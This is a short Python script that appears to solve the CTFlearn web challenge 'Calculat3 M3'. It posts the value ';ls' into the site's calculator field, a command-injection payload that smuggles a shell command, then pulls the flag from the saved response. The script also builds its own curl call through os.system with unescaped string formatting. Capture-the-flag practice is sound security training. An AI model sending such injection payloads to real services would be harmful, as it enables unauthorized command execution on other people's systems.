import os

website = "https://web.ctflearn.com/web7/"
expression = ";ls"
output_path = "Calculat3_M3/res.txt"

os.system('curl -L "{}" -d "expression={}" > {}'.format(website, expression, output_path))

with open(output_path, 'r') as f:
    data = f.readlines()

Flag = [ele for ele in data if "{" in ele][0][:-1]
print(Flag)

